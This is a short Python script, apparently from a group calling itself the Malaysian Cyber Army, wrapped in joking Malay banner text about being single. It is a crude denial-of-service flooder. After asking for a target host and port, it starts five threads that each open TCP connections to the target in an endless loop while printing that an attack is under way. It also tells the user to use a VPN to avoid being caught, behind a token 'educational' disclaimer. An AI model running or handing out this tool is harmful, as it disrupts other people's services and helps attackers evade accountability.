#!/use it only for educational! saya tidak bertanggungjawab jika anda ditangkap
#!/Malaysian Cyber Army
import os
import socket
import sys
import threading
os.system("cls")
print("haha single")
os.system("cls")
os.system("color 6")
print("\n")
print("[+] TOOLS UNTUK ORG SINGLE MACAM KAU, TAPI JANGAN RISAU SBB, MACAM AKU JUGA :( [+]")
print("[+] TAPI KAU PATUT BANGGA SBB ALLAH SUDAH JAUHKAN KAU DARI ZINA:) HEV NAIS DAY [+]")
single = input("\nMessage merepek yg kawuck nk bagi kat Imy . . .ape dia? ->  ")
print("\nOk tq :) Semoga Anda Dapat Hari yg Tenang")
nama = input("\nOh ye, Ape Nama Anda? saya Imy -> ")
print("\nCantik nama " +nama )
os.system("color 4")
print("\n[+] PERINGATAN BUAT " +nama )
print("\nImy tidak akan bertanggungjawab ke atas perbuatan " +nama )
print("jika Di TANGKAP!, Jadi silalah awuck guna VPN")
os.system("color 6")
host = input("\nEnter host: ")
port = int(input("\nEnter port: "))
print("\n")
os.system("color 4")
def run(h):
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        print("[+] Sedang Menyerang [+] = Packet telah dihantar ke " + host )
for i in range(5):
    t = threading.Thread(target=run, args=[i])
    t.start()